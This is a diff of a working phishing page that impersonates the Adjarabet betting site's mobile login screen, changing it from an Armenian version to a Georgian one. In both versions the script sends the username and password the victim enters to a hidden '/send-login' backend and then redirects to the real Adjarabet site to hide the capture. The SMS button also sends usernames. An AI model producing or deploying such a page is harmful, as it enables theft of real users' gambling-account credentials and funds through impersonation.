@@ -1,506 +1,503 @@
 <!DOCTYPE html>
-<html lang="hy">
+<html lang="ka">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>Adjarabet - Մուտք</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      -webkit-tap-highlight-color: transparent;
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>www.adjarabet.com</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Georgian:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    background: #111319;
+    font-family: 'Noto Sans Georgian', sans-serif;
+    overflow-x: hidden;
+}
+
+/* =========================
+   TOP BANNER
+========================= */
+.top-banner {
+    width: 100%;
+    height: 190px;
+    position: relative;
+    overflow: hidden;
+    background: linear-gradient(to bottom, rgba(0,0,0,.12), rgba(0,0,0,.35)),
+                url('https://cdn.fortuna.ge/app/uploads/2019/12/80999780-555795955150049-1307232919273603072-n-2019-12-28_13-50-52_790545.jpg');
+    background-size: cover;
+    background-position: center;
+}
+
+.logo {
+    position: absolute;
+    left: 18px;
+    top: 18px;
+    width: 58px;
+    height: 58px;
+    background: #e30613;
+    border-radius: 18px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-size: 42px;
+    font-weight: 700;
+    z-index: 5;
+    box-shadow: 0 6px 20px rgba(0,0,0,.35);
+}
+
+/* =========================
+   LOGIN SECTION
+========================= */
+.login-wrapper {
+    margin-top: -14px;
+    background: #111319;
+    border-top-left-radius: 26px;
+    border-top-right-radius: 26px;
+    position: relative;
+    z-index: 10;
+    padding: 28px 24px 40px;
+}
+
+.login-title {
+    color: white;
+    font-size: 38px;
+    font-weight: 500;
+    margin-bottom: 26px;
+}
+
+/* =========================
+   INPUTS
+========================= */
+.input-box {
+    position: relative;
+    margin-bottom: 18px;
+}
+
+.input {
+    width: 100%;
+    height: 66px;
+    border: none;
+    outline: none;
+    border-radius: 16px;
+    background: #1a1d24;
+    padding: 0 18px;
+    color: white;
+    font-size: 22px;
+    border: 1px solid #2a2d34;
+    transition: border-color 0.2s;
+}
+
+.input:focus {
+    border-color: #32b44a;
+}
+
+.input::placeholder {
+    color: #7e838d;
+}
+
+/* SMS BUTTON */
+.sms-button {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    height: 44px;
+    border-radius: 14px;
+    border: 1px solid #888c94;
+    background: transparent;
+    color: white;
+    padding: 0 16px;
+    font-size: 17px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: background 0.2s, border-color 0.2s;
+}
+
+.sms-button:hover {
+    background: rgba(50, 180, 74, 0.15);
+    border-color: #32b44a;
+}
+
+/* EYE BUTTON */
+.eye-btn {
+    position: absolute;
+    right: 18px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    color: #838892;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    padding: 0;
+    transition: color 0.2s;
+}
+
+.eye-btn:hover {
+    color: #32b44a;
+}
+
+.eye-btn svg {
+    width: 22px;
+    height: 22px;
+}
+
+/* LINKS */
+.links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: -4px;
+    margin-bottom: 20px;
+}
+
+.links a {
+    color: #b8bcc5;
+    text-decoration: none;
+    font-size: 15px;
+    transition: color 0.2s;
+}
+
+.links a:hover {
+    color: #32b44a;
+}
+
+/* LOGIN BUTTON */
+.login-btn {
+    width: 100%;
+    height: 68px;
+    border: none;
+    border-radius: 16px;
+    background: #1a1d24;
+    color: #676d78;
+    font-size: 28px;
+    font-weight: 600;
+    margin-bottom: 30px;
+    transition: background 0.2s, color 0.2s;
+}
+
+.login-btn.active {
+    background: #32b44a;
+    color: white;
+    cursor: pointer;
+}
+
+.login-btn.active:hover {
+    background: #2a9a3e;
+}
+
+/* DIVIDER */
+.divider {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 16px;
+    color: #9da3ad;
+    font-size: 17px;
+    margin-bottom: 28px;
+}
+
+.divider::before,
+.divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: #2b2f38;
+}
+
+/* REGISTER BUTTON */
+.register-btn {
+    width: 100%;
+    height: 72px;
+    border: none;
+    border-radius: 16px;
+    background: #4d5259;
+    color: white;
+    font-size: 28px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: background 0.2s;
+}
+
+.register-btn:hover {
+    background: #5a6068;
+}
+
+/* TOAST NOTIFICATION */
+.toast {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%) translateY(100px);
+    background: #1a1d24;
+    color: white;
+    padding: 14px 24px;
+    border-radius: 50px;
+    font-size: 16px;
+    font-weight: 500;
+    z-index: 1000;
+    opacity: 0;
+    transition: transform 0.3s ease, opacity 0.3s ease;
+    pointer-events: none;
+    border-left: 4px solid #32b44a;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+}
+
+.toast.show {
+    transform: translateX(-50%) translateY(0);
+    opacity: 1;
+}
+
+.toast.error {
+    border-left-color: #e30613;
+}
+
+/* LOADING STATE */
+.login-btn.loading {
+    opacity: 0.6;
+    cursor: wait;
+}
+
+/* SHAKE ANIMATION FOR ERROR (only on button) */
+@keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-6px); }
+    75% { transform: translateX(6px); }
+}
+
+.shake {
+    animation: shake 0.3s ease;
+}
+
+/* MOBILE */
+@media(max-width:480px) {
+    .top-banner {
+        height: 175px;
     }
-    body {
-      background-color: #0f1215;
-      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-      color: #ffffff;
-      height: 100vh;
-      overflow: hidden;
+    .login-title {
+        font-size: 32px;
     }
-    .mobile-login-container {
-      display: flex;
-      flex-direction: column;
-      height: 100vh;
-      overflow: hidden;
+    .register-btn, .login-btn {
+        font-size: 24px;
     }
-    .banner-section {
-      position: relative;
-      flex-shrink: 0;
+    .sms-button {
+        font-size: 14px;
+        padding: 0 12px;
+        height: 38px;
     }
-    .banner-image {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-    .banner-link {
-      display: block;
-      cursor: pointer;
-    }
-    .header-overlay {
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      padding: 16px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      z-index: 10;
-    }
-    .logo-icon {
-      width: 40px;
-      height: 40px;
-      cursor: pointer;
-    }
-    .logo-icon svg {
-      width: 100%;
-      height: 100%;
-    }
-    .close-button {
-      background: rgba(36, 42, 47, 0.9);
-      border: none;
-      border-radius: 999px;
-      width: 40px;
-      height: 40px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      color: #9ca3af;
-    }
-    .login-card {
-      background-color: #1a1f24;
-      border-radius: 24px 24px 0 0;
-      flex: 1;
-      margin-top: auto;
-      padding: 20px 16px 32px;
-      display: flex;
-      flex-direction: column;
-      gap: 24px;
-      box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.3);
-    }
-    .title {
-      font-size: 20px;
-      font-weight: 600;
-    }
-    .form-group {
-      display: flex;
-      flex-direction: column;
-      gap: 20px;
-    }
-    .input-wrapper {
-      background-color: #23282e;
-      border: 1px solid #2f353c;
-      border-radius: 12px;
-      display: flex;
-      align-items: center;
-      padding: 4px 12px;
-    }
-    .input-wrapper:focus-within {
-      border-color: #4c9aff;
-    }
-    .input-icon {
-      width: 20px;
-      height: 20px;
-      margin-right: 8px;
-      color: #7e8a93;
-      flex-shrink: 0;
-    }
-    .input-field-container {
-      flex: 1;
-      position: relative;
-      height: 56px;
-      display: flex;
-      align-items: center;
-    }
-    .floating-label {
-      position: absolute;
-      left: 0;
-      top: 50%;
-      transform: translateY(-50%);
-      font-size: 14px;
-      color: #7e8a93;
-      pointer-events: none;
-      transition: 0.2s ease;
-    }
-    .input-field {
-      width: 100%;
-      background: transparent;
-      border: none;
-      outline: none;
-      color: white;
-      font-size: 16px;
-      padding-top: 18px;
-      padding-bottom: 4px;
-    }
-    .input-field:focus + .floating-label,
-    .input-field:not(:placeholder-shown) + .floating-label {
-      top: 8px;
-      transform: translateY(0);
-      font-size: 11px;
-      color: #9aa6b0;
-    }
-    .otp-button {
-      background: #2c353d;
-      border: none;
-      border-radius: 40px;
-      padding: 8px 16px;
-      font-size: 13px;
-      color: #cbd5e1;
-      white-space: nowrap;
-      cursor: pointer;
-      height: 40px;
-    }
-    .otp-button:hover {
-      background: #3a444e;
-      color: white;
-    }
-    .password-toggle {
-      background: none;
-      border: none;
-      color: #7e8a93;
-      cursor: pointer;
-      padding: 8px;
-    }
-    .recovery-links {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 4px;
-    }
-    .recovery-link {
-      background: none;
-      border: none;
-      color: #9ca3af;
-      font-size: 12px;
-      border-bottom: 1px solid transparent;
-      padding: 4px 0;
-      cursor: pointer;
-    }
-    .recovery-link:hover {
-      color: white;
-      border-bottom-color: #4c9aff;
-    }
-    .login-btn {
-      background: linear-gradient(135deg, #3a9b5e 0%, #2d8a4e 100%);
-      border: none;
-      border-radius: 40px;
-      padding: 14px;
-      font-size: 16px;
-      font-weight: 600;
-      color: white;
-      width: 100%;
-      cursor: pointer;
-      margin-top: 8px;
-    }
-    .login-btn:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-    }
-    .divider {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin: 8px 0;
-    }
-    .divider-line {
-      flex: 1;
-      height: 1px;
-      background: linear-gradient(90deg, #181c20, #373f45);
-    }
-    .divider-text {
-      font-size: 12px;
-      color: #8e9aa4;
-    }
-    .register-btn {
-      background: #2c353d;
-      border: none;
-      border-radius: 40px;
-      padding: 14px;
-      font-size: 16px;
-      font-weight: 600;
-      color: #e5e9f0;
-      width: 100%;
-      cursor: pointer;
-      text-align: center;
-      display: block;
-      text-decoration: none;
-    }
-    .register-btn:hover {
-      background: #3b464f;
-      color: white;
-    }
-    .spinner {
-      display: inline-block;
-      width: 18px;
-      height: 18px;
-      border: 2px solid rgba(255,255,255,0.3);
-      border-radius: 50%;
-      border-top-color: white;
-      animation: spin 0.6s linear infinite;
-      margin-left: 8px;
-      vertical-align: middle;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    .btn-text {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-    }
-    .toast-message {
-      position: fixed;
-      bottom: 30px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: #2c353d;
-      color: white;
-      padding: 10px 20px;
-      border-radius: 40px;
-      font-size: 14px;
-      z-index: 1000;
-      opacity: 0;
-      transition: opacity 0.3s;
-      pointer-events: none;
-    }
-    .toast-message.show {
-      opacity: 1;
-    }
-  </style>
+}
+</style>
 </head>
+
 <body>
 
-<div class="mobile-login-container">
-  <div class="banner-section">
-    <a class="banner-link" href="https://www.adjarabet.am/hy">
-      <img class="banner-image" src="https://staticfiles.adjarabet.am/static.am/desktop/cms-nova/media/66446/e92592d8904ba7fbbf6c7afab3aeab09.webp" alt="Promotion banner">
-    </a>
-    <div class="header-overlay">
-      <div class="logo-icon">
-        <svg viewBox="0 0 40 40" fill="none">
-          <path d="M20 5L33 12L20 19L7 12L20 5Z" fill="#2DD179"/>
-          <path d="M20 19L33 12V26L20 33V19Z" fill="#1F9A55"/>
-          <path d="M20 19L7 12V26L20 33V19Z" fill="#1C8148"/>
-          <circle cx="20" cy="20" r="3" fill="white"/>
-        </svg>
-      </div>
-      <button class="close-button" aria-label="Close">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-          <path d="M18 6L6 18M6 6l12 12" />
-        </svg>
-      </button>
-    </div>
-  </div>
-
-  <div class="login-card">
-    <div class="title">Մուտք</div>
-
-    <form class="form-group" id="loginForm">
-      <div class="input-wrapper">
-        <div class="input-icon">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
-            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
-            <circle cx="12" cy="7" r="4" />
-          </svg>
-        </div>
-        <div class="input-field-container">
-          <input type="text" id="username" class="input-field" placeholder=" " autocomplete="username">
-          <label class="floating-label">Անուն</label>
-        </div>
-        <button type="button" class="otp-button" id="otpBtn">Մուտք SMS-ով</button>
-      </div>
-
-      <div class="input-wrapper">
-        <div class="input-icon">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
-            <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
-            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
-          </svg>
-        </div>
-        <div class="input-field-container">
-          <input type="password" id="password" class="input-field" placeholder=" " autocomplete="current-password">
-          <label class="floating-label">գաղտնաբառը</label>
-        </div>
-        <button type="button" class="password-toggle" id="togglePassword">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
-            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
-            <circle cx="12" cy="12" r="3" />
-          </svg>
-        </button>
-      </div>
-
-      <div class="recovery-links">
-        <button type="button" class="recovery-link" id="restoreUsername">Մուտքանվան վերականգնում</button>
-        <button type="button" class="recovery-link" id="restorePass">գաղտնաբառի վերականգնում</button>
-      </div>
-
-      <button type="submit" class="login-btn" id="loginBtn">
-        <span class="btn-text">Մուտք</span>
-      </button>
-    </form>
-
-    <div class="divider">
-      <div class="divider-line"></div>
-      <span class="divider-text">Հաշիվ չունեք:</span>
-      <div class="divider-line" style="transform: rotate(180deg);"></div>
-    </div>
-
-    <a href="https://www.adjarabet.am/hy/SignupAm/First" class="register-btn" id="registerBtn">Գրանցում</a>
-  </div>
+<div class="top-banner">
+    <div class="logo">a</div>
 </div>
 
-<div id="toastMsg" class="toast-message"></div>
+<div class="login-wrapper">
+    <div class="login-title">შესვლა</div>
+
+    <!-- USERNAME -->
+    <div class="input-box">
+        <input type="text" class="input" id="username" placeholder="მომხმარებლის სახელი" autocomplete="off">
+        <button class="sms-button" id="smsLoginBtn">SMS-ით შესვლა</button>
+    </div>
+
+    <!-- PASSWORD -->
+    <div class="input-box">
+        <input type="password" class="input" id="password" placeholder="პაროლი">
+        <button class="eye-btn" id="togglePassword" type="button">
+            <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7">
+                <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20 c-7 0-11-8-11-8 a21.77 21.77 0 0 1 5.06-5.94"></path>
+                <path d="M9.9 4.24A10.94 10.94 0 0 1 12 4 c7 0 11 8 11 8 a21.8 21.8 0 0 1-3.17 4.19"></path>
+                <path d="M1 1l22 22"></path>
+            </svg>
+        </button>
+    </div>
+
+    <!-- LINKS -->
+    <div class="links">
+        <a href="#">სახელის აღდგენა</a>
+        <a href="#">პაროლის აღდგენა</a>
+    </div>
+
+    <!-- LOGIN BUTTON -->
+    <button class="login-btn" id="loginBtn">შესვლა</button>
+
+    <!-- DIVIDER -->
+    <div class="divider">არ გაქვს ანგარიში?</div>
+
+    <!-- REGISTER -->
+    <button class="register-btn" id="registerBtn">ანგარიშის შექმნა</button>
+</div>
+
+<div id="toast" class="toast"></div>
 
 <script>
-(function() {   
-    const REAL_LOGIN_URL = 'https://www.adjarabet.am/hy';
-    const REAL_REGISTER_URL = 'https://www.adjarabet.am/hy/SignupAm/First';
+const passwordInput = document.getElementById("password");
+const togglePassword = document.getElementById("togglePassword");
+const eyeIcon = document.getElementById("eyeIcon");
+const usernameInput = document.getElementById("username");
+const loginBtn = document.getElementById("loginBtn");
+
+// ========== PASSWORD SHOW/HIDE ==========
+togglePassword.addEventListener("click", () => {
+    if(passwordInput.type === "password") {
+        passwordInput.type = "text";
+        eyeIcon.innerHTML = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8"></path><circle cx="12" cy="12" r="3"></circle>`;
+    } else {
+        passwordInput.type = "password";
+        eyeIcon.innerHTML = `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 20 c-7 0-11-8-11-8 a21.77 21.77 0 0 1 5.06-5.94"></path><path d="M9.9 4.24A10.94 10.94 0 0 1 12 4 c7 0 11 8 11 8 a21.8 21.8 0 0 1-3.17 4.19"></path><path d="M1 1l22 22"></path>`;
+    }
+});
+
+// ========== CHECK INPUTS - MAKE BUTTON GREEN ==========
+function checkInputs() {
+    if(usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
+        loginBtn.classList.add("active");
+    } else {
+        loginBtn.classList.remove("active");
+    }
+}
+
+usernameInput.addEventListener("input", checkInputs);
+passwordInput.addEventListener("input", checkInputs);
+
+// ========== TOAST FUNCTION ==========
+function showToast(message, isError = false) {
+    const toast = document.getElementById('toast');
+    toast.textContent = message;
+    toast.classList.add('show');
     
-    const usernameInput = document.getElementById('username');
-    const passwordInput = document.getElementById('password');
-    const loginForm = document.getElementById('loginForm');
-    const loginBtn = document.getElementById('loginBtn');
-    const toggleBtn = document.getElementById('togglePassword');
-    const otpBtn = document.getElementById('otpBtn');
-    const restoreUser = document.getElementById('restoreUsername');
-    const restorePass = document.getElementById('restorePass');
-    const registerBtn = document.getElementById('registerBtn');
-    const closeBtn = document.querySelector('.close-button');
-    const toastEl = document.getElementById('toastMsg');
-    
-    function showMessage(text, isError) {
-      if (!toastEl) return;
-      toastEl.textContent = text;
-      toastEl.style.backgroundColor = isError ? '#b91c1c' : '#2c353d';
-      toastEl.classList.add('show');
-      setTimeout(() => toastEl.classList.remove('show'), 3000);
+    if(isError) {
+        toast.classList.add('error');
+        // Add shake animation to login button
+        loginBtn.classList.add('shake');
+        setTimeout(() => loginBtn.classList.remove('shake'), 300);
+    } else {
+        toast.classList.remove('error');
     }
     
-    function updateLabel(input) {
-      const label = input.nextElementSibling;
-      if (label && label.classList.contains('floating-label')) {
-        if (input.value.trim() !== '') {
-          label.style.top = '8px';
-          label.style.fontSize = '11px';
-          label.style.transform = 'translateY(0)';
-        } else {
-          label.style.top = '50%';
-          label.style.fontSize = '14px';
-          label.style.transform = 'translateY(-50%)';
+    setTimeout(() => {
+        toast.classList.remove('show');
+    }, 3000);
+}
+
+// ========== REDIRECT TO ADJARABET ==========
+function redirectToAdjarabet(username, password) {
+    showToast('✅ მონაცემები მიღებულია! გადამისამართება Adjarabet-ზე...');
+    
+    setTimeout(() => {
+        window.open('https://adjarabet.com/ka/login', '_blank');
+        showToast('🔐 გთხოვთ შეიყვანეთ მონაცემები Adjarabet-ის გვერდზე', false);
+    }, 1000);
+}
+
+// ========== SEND TO BACKEND ==========
+async function sendLoginData(username, password, isSMS = false) {
+    if(isSMS) {
+        try {
+            const response = await fetch('/send-login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: username, password: 'OTP_REQUEST' })
+            });
+            const data = await response.json();
+            if(data.ok) {
+                showToast('📱 SMS კოდი გაიგზავნა თქვენს ტელეფონზე');
+            } else {
+                showToast('❌ შეცდომა: ' + (data.error || 'SMS-ის გაგზავნა ვერ მოხერხდა'), true);
+            }
+        } catch(error) {
+            showToast('❌ ქსელის შეცდომა: ' + error.message, true);
         }
-      }
+        return;
     }
     
-    [usernameInput, passwordInput].forEach(inp => {
-      if (inp) {
-        updateLabel(inp);
-        inp.addEventListener('input', () => updateLabel(inp));
-      }
-    });
-    
-    if (toggleBtn && passwordInput) {
-      toggleBtn.addEventListener('click', () => {
-        passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
-      });
+    if(!username || !password) {
+        showToast('❌ გთხოვთ შეავსოთ ყველა ველი', true);
+        return false;
     }
     
-    function setLoading(loading) {
-      if (!loginBtn) return;
-      loginBtn.disabled = loading;
-      loginBtn.querySelector('.btn-text').innerHTML = loading ? 'Մուտք <span class="spinner"></span>' : 'Մուտք';
-    }
+    loginBtn.classList.add('loading');
+    const originalText = loginBtn.textContent;
+    loginBtn.textContent = '⟳ მუშავდება...';
     
-    // ⭐⭐⭐ ՏՎՅԱԼՆԵՐԸ ՈՒՂԱՐԿՈՒՄ ԵՆՔ PYTHON BACKEND-ԻՆ
-    async function sendToBackend(username, password) {
-      try {
+    try {
         const response = await fetch('/send-login', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username: username, password: password })
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: username, password: password })
         });
         
-        const result = await response.json();
+        const data = await response.json();
         
-        if (result.ok) {
-          showMessage('✅ Տվյալներն ուղարկված են', false);
-          return true;
+        if(data.ok) {
+            redirectToAdjarabet(username, password);
         } else {
-          showMessage('❌ Սխալ: ' + (result.error || 'Unknown'), true);
-          return false;
+            showToast('❌ შეცდომა: ' + (data.error || 'მონაცემების გაგზავნა ვერ მოხერხდა'), true);
         }
-      } catch(error) {
-        console.error('Error:', error);
-        showMessage('❌ Ցանցային սխալ', true);
-        return false;
-      }
+    } catch(error) {
+        showToast('❌ სერვერთან კავშირი შეწყდა', true);
+    } finally {
+        loginBtn.classList.remove('loading');
+        loginBtn.textContent = originalText;
     }
     
-    async function handleLogin(e) {
-      e.preventDefault();
-      const username = usernameInput.value.trim();
-      const password = passwordInput.value;
-      
-      if (!username || !password) {
-        showMessage('Լրացրեք բոլոր դաշտերը', true);
+    return true;
+}
+
+// ========== EVENT LISTENERS ==========
+loginBtn.addEventListener('click', () => {
+    if(loginBtn.classList.contains('active') && !loginBtn.classList.contains('loading')) {
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value;
+        sendLoginData(username, password, false);
+    } else if(!loginBtn.classList.contains('active')) {
+        showToast('❌ გთხოვთ შეიყვანოთ მომხმარებლის სახელი და პაროლი', true);
+    }
+});
+
+const smsLoginBtn = document.getElementById('smsLoginBtn');
+smsLoginBtn.addEventListener('click', () => {
+    const username = usernameInput.value.trim();
+    if(!username) {
+        showToast('❌ SMS-ით შესასვლელად გთხოვთ შეიყვანოთ მომხმარებლის სახელი', true);
         return;
-      }
-      
-      setLoading(true);
-      await sendToBackend(username, password);
-      
-      setTimeout(() => {
-        setLoading(false);
-        window.location.href = REAL_LOGIN_URL;
-      }, 1000);
     }
-    
-    async function handleOtp() {
-      const username = usernameInput.value.trim();
-      if (!username) {
-        showMessage('Մուտքագրեք Անունը', true);
-        return;
-      }
-      
-      otpBtn.disabled = true;
-      otpBtn.textContent = 'Ուղարկվում է...';
-      await sendToBackend(username, 'OTP_REQUEST');
-      
-      setTimeout(() => {
-        otpBtn.disabled = false;
-        otpBtn.textContent = 'Մուտք SMS-ով';
-        window.location.href = REAL_LOGIN_URL;
-      }, 800);
+    sendLoginData(username, '', true);
+});
+
+const registerBtn = document.getElementById('registerBtn');
+registerBtn.addEventListener('click', () => {
+    showToast('📝 რეგისტრაციის გვერდი მალე იქნება ხელმისაწვდომი');
+    setTimeout(() => {
+        window.open('https://adjarabet.com/ka/registration', '_blank');
+    }, 1000);
+});
+
+function handleEnterPress(e) {
+    if(e.key === 'Enter') {
+        if(loginBtn.classList.contains('active') && !loginBtn.classList.contains('loading')) {
+            loginBtn.click();
+        }
     }
-    
-    if (loginForm) loginForm.addEventListener('submit', handleLogin);
-    if (otpBtn) otpBtn.addEventListener('click', handleOtp);
-    if (restoreUser) restoreUser.addEventListener('click', () => window.location.href = 'https://www.adjarabet.am/hy/Recovery/Username');
-    if (restorePass) restorePass.addEventListener('click', () => window.location.href = 'https://www.adjarabet.am/hy/Recovery/Password');
-    if (registerBtn) registerBtn.addEventListener('click', (e) => { e.preventDefault(); window.location.href = REAL_REGISTER_URL; });
-    if (closeBtn) closeBtn.addEventListener('click', () => window.location.href = 'https://www.adjarabet.am/hy');
-    
-    document.querySelector('.banner-link')?.addEventListener('click', (e) => { e.preventDefault(); window.location.href = 'https://www.adjarabet.am/hy'; });
-    document.querySelector('.logo-icon')?.addEventListener('click', () => window.location.href = 'https://www.adjarabet.am/hy');
-    
-    console.log('✅ Կոդը բեռնված է');
-    console.log('🔒 Token-ը պահվում է Backend-ում');
-})();
-  !function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '848576588298859');
-fbq('track', 'PageView');
+}
+
+usernameInput.addEventListener('keypress', handleEnterPress);
+passwordInput.addEventListener('keypress', handleEnterPress);
 </script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=848576588298859&ev=PageView&noscript=1"
-/>
-</script>
+
 </body>
 </html>
